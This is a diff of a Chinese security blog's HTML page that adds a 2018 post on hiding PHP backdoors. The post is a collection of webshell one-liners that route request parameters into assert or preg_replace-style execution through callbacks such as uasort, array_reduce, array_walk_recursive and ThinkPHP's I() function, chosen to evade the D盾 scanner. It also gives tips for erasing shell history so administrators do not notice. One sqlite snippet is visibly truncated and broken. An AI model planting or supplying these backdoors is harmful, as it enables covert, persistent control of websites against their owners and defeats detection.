@@ -6,13 +6,13 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://ph0rse.me">
-  <title>Archives | Ph0rse&#39;s Blog</title>
+  <title>Ph0rse&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="CUIT就读，Auto代码审计，唯一优点就是帅~">
 <meta name="keywords" content="Web,安全,Python,Java,PHP,Coder,Hacker,Linux,程序员,工程师,渗透,优化,帅哥,机器学习">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Ph0rse&#39;s Blog">
-<meta property="og:url" content="http://ph0rse.me/archives/index.html">
+<meta property="og:url" content="http://ph0rse.me/page/3/index.html">
 <meta property="og:site_name" content="Ph0rse&#39;s Blog">
 <meta property="og:description" content="CUIT就读，Auto代码审计，唯一优点就是帅~">
 <meta property="og:locale" content="default">
@@ -164,49 +164,150 @@
           <div id="js-content" class="content-ll">
             
   
-  
+    <article id="post-奇淫异巧之PHP后门" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/02/16/JavaScript前端盲注/" class="archive-article-date">
-  	<time datetime="2019-02-16T08:57:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-16</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
     <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/02/16/JavaScript前端盲注/">JavaScript前端盲注</a>
+      <a class="article-title" href="/2018/06/27/奇淫异巧之PHP后门/">奇淫异巧之PHP后门</a>
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2018/06/27/奇淫异巧之PHP后门/" class="archive-article-date">
+  	<time datetime="2018-06-27T13:19:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文章首发于信安之路</p>
+<h1 id="奇淫异巧之PHP后门"><a href="#奇淫异巧之PHP后门" class="headerlink" title="奇淫异巧之PHP后门"></a>奇淫异巧之PHP后门</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>早上看了一位小伙伴在公众号发的文章“PHP后门隐藏技巧”，写的挺好，其中有一些姿势是我之前没见到过了，学到很很多。同时，这篇文章也引发了自己的一点点思考：“PHP后门的关键点在哪里？”，也欢迎上篇文章的作者、其它小伙伴一起来讨论。<br>上篇文章中的很多姿势很巧妙，尤其在比赛的时候，可以重点关注一下。但部分姿势，类似不死马这种东西，是否是留后门的正确选择呢？<br>个人认为，后门的关键，在于“隐蔽”。而不死马这类后门的特点，其实是“顽固”。然而在系统最高权限的运维手里……顽固貌似没有太大用处，只要发现了，总有办法给你干掉。<br>而对于隐蔽来说，有以下几点要素：</p>
+<ol>
+<li>熟悉环境，模拟环境，适应环境，像一只变色龙一样隐藏</li>
+<li>清除痕迹，避免运维发现</li>
+<li>避免后门特征值被D盾等工具检测到</li>
+</ol>
+<p>就以上几点点，放出一些我收藏的技巧~其思路来源于各位师傅，尤其是<a href="https://www.leavesongs.com/" target="_blank" rel="noopener">P神</a>的博客。</p>
+<h3 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h3><h4 id="一般过狗思路"><a href="#一般过狗思路" class="headerlink" title="一般过狗思路"></a>一般过狗思路</h4><p>最一般的绕狗、后门思路就是</p>
+<pre><code>call_user_func(&apos;assert&apos;, $_REQUEST[&apos;pass&apos;]);
+</code></pre><p>直接参数回调，将<code>$_REQUEST[&#39;pass&#39;]</code>传入的数据，传递给assert函数去执行。</p>
+<h4 id="双参数回调后门"><a href="#双参数回调后门" class="headerlink" title="双参数回调后门"></a>双参数回调后门</h4><p>在PHP5.4.8+版本中，assert有一个新的可选参数descrition。所以较于之前的PHP版本，我们可以使用一些新的方式去进行调用，这些新的方式也暂时还没有添加到D盾的特征匹配中。</p>
+<p>Talk is cheap show me the code~</p>
+<pre><code>&lt;?php
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array(&apos;test&apos;, $_REQUEST[&apos;pass&apos;]);
+uasort($arr, base64_decode($e));
+</code></pre><p>$_REQUEST[‘e’]的话，传递GET或者POST参数都可以。</p>
+<p>uasort函数在手册里这样定义：</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201806251646_69.png" alt><br>如果我们传入的比较函数是assert的话，就会产生代码执行。</p>
+<p>先将参数保存为一个数组，传入’assert’的base64编码，使用uasort函数调用即可。</p>
+<p>由此方法引申出的姿势有：<br><br>一. 换为uksort函数：</p>
+<pre><code>&lt;?php
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array(&apos;test&apos; =&gt; 1, $_REQUEST[&apos;pass&apos;] =&gt; 2);
+uksort($arr, $e);
+</code></pre><p>二. 面向对象的方法：</p>
+<pre><code>&lt;?php
+// way 0
+$arr = new ArrayObject(array(&apos;test&apos;, $_REQUEST[&apos;pass&apos;]));
+$arr-&gt;uasort(&apos;assert&apos;);
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+// way 1
+$arr = new ArrayObject(array(&apos;test&apos; =&gt; 1, $_REQUEST[&apos;pass&apos;] =&gt; 2));
+$arr-&gt;uksort(&apos;assert&apos;);
+</code></pre><p>三. array_reduce</p>
+<pre><code>&lt;?php
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array(1);
+array_reduce($arr, $e, $_POST[&apos;pass&apos;]);
+</code></pre><p>四. array_udiff</p>
+<pre><code>&lt;?php
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array($_POST[&apos;pass&apos;]);
+$arr2 = array(1);
+array_udiff($arr, $arr2, $e);
+</code></pre><h4 id="三参数回调后门"><a href="#三参数回调后门" class="headerlink" title="三参数回调后门"></a>三参数回调后门</h4><p>上面的函数都是两个参数，然后回调指定函数的，下面还有3个参数的：</p>
+<pre><code>&lt;?php
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array($_POST[&apos;pass&apos;] =&gt; &apos;|.*|e&apos;,);
+array_walk_recursive($arr, $e, &apos;&apos;);
+</code></pre><p>这段代码的最终效果是回调名字为$e的函数，$arr数组中的<code>$_POST[pass]</code>（键）作为回调函数的第一个参数，<code>&#39;|.*|e&#39;</code>作为第二个参数。<code>&#39;&#39;</code>作为第三个参数。</p>
+<p>有哪些函数是可以三个参数并且代码执行or命令执行的呢？<br>最最常见的：preg_replace函数在e修饰符条件下可以进行命令执行，原理可以看<a href="http://0day5.com/archives/4016/" target="_blank" rel="noopener">这个文章</a></p>
+<p>最后的效果为：</p>
+<pre><code>preg_replace(&apos;|.*|e&apos;, &apos;你的命令&apos;, &apos;&apos;);
+</code></pre><p>但preg_replace并不能直接用，因为D盾会将它作为特征值去检测，我们可以换一些其它效果类似的函数：</p>
+<pre><code>mb_ereg_replace
+preg_filter
+</code></pre><h4 id="sqlite回调后门"><a href="#sqlite回调后门" class="headerlink" title="sqlite回调后门"></a>sqlite回调后门</h4><p>如果可以使用PDO的话，可以用sqlite的PDO来执行代码</p>
+<pre><code>&lt;?php
+$db = new PDO(&apos;sqlite::memory:&apos;);
+$st = $db-&gt;query(&quot;SELECT &apos;phpinfo()&apos;&quot;);
+$re = $st-&gt;frtch
+?&gt;
+</code></pre><p>隐蔽性满满的~</p>
+<h4 id="反序列化后门"><a href="#反序列化后门" class="headerlink" title="反序列化后门"></a>反序列化后门</h4><p>之前说了要适应环境，增强隐蔽性，所以可以根据目标代码，去添加一些恶意类，然后用反序列化漏洞来传递命令，并且可以通过捏造可信度比较高的的类名，在index.php中就直接引用，更不容易被发现。<br>传输过程中，还可以进行一些加密、混淆操作，来绕过waf端检测。<br>思路可参照，前一阵子typecho爆出的<a href="https://www.th1s.cn/index.php/2017/10/25/138.html" target="_blank" rel="noopener">反序列化漏洞</a></p>
+<h4 id="thinkphp特征后门"><a href="#thinkphp特征后门" class="headerlink" title="thinkphp特征后门"></a>thinkphp特征后门</h4><p>thinkphp的自带方法中，存在可以作为后门的I函数<br>具体代码逻辑比较复杂，有兴趣的同学可以移步P神的<a href="https://www.leavesongs.com/PENETRATION/thinkphp-callback-backdoor.html" target="_blank" rel="noopener">文章</a><br>只要在可访问的地方，加上一行代码：</p>
+<pre><code>I(&apos;post.ph0rse&apos;,&apos;&apos;,I(&apos;get.i&apos;));
+</code></pre><p>就可以传递GET参数：i=assert, POST参数ph0rse=你的命令<br>并且可以远连菜刀~</p>
+<p>同样，通过审计，在其它开源框架中其实也可以发现类似的留后门技巧。直接调用源类库里的方法，再稍微加一点混淆和加密，就很难被发现了。</p>
+<h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><h4 id="真正的后门，要靠系统层"><a href="#真正的后门，要靠系统层" class="headerlink" title="真正的后门，要靠系统层"></a>真正的后门，要靠系统层</h4><p>对于PHP后门来说，如果能做到隐蔽性，不会被D盾等工具自动检测出来。人工查看时，一时半会儿也看不出有问题，其实就够了。</p>
+<p>受限于运维的日志审查，通过PHP去进行后渗透不太现实，PHP后门最大的意义在于，留有一个通道。等其它通道关闭或者网站迁移（总要移代码吧）时，能够维持对目标站的控制。</p>
+<p>而真正的后渗透操作，还是要考系统层的其它技巧，比如shift后门，ssh后门，注册表木马等等~这些都是后话了~</p>
+<h4 id="擦除痕迹"><a href="#擦除痕迹" class="headerlink" title="擦除痕迹"></a>擦除痕迹</h4><p>想要让后面隐蔽，除了以上几点，还要清理好文件操作的痕迹。在Linux下就是删除.bash_history和.viminfo的记录，这些记录显示了你前段时间执行了哪些命令，修改了哪些文本。<br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251657_589.png" alt><br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251658_703.png" alt><br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251700_727.png" alt><br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251700_103.png" alt></p>
+<p>而在windows下，就是在注册表中做一些操作~</p>
+<p>上一篇文章突然激起了写作欲，但受限于时间，没能去一步一步截图。当然，这篇文章主要是想阐述思路，比如回调函数的妙用，PHP后门应该是什么样~</p>
+<p>文中介绍的姿势是我自己实战或者打比赛常用的，搜集而成，并非原创。但可以保证，这些姿势我都试过，复现起来是完全OK的~</p>
+<p>跳出PHP，讨论后面的话，就比较复杂了，从悄咪咪留后门，到秘密管理后门、窃听数据，再到清理痕迹~各种姿势，千方百怪，前几天还学到了利用微信客户端来留后门远控的~<br>那就是很长的一篇故事了</p>
+<p>有机会再和大家分享吧~也希望能抛砖引玉，大家一起来聊一聊你所知道的，新奇的后门技巧</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/06/27/奇淫异巧之PHP后门/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-  
-    </div></section>
-  
 
-    
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+  
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/6/">6</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
     </nav>
   
 
@@ -230,9 +331,9 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: false,
+		isHome: true,
 		isPost: false,
-		isArchive: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
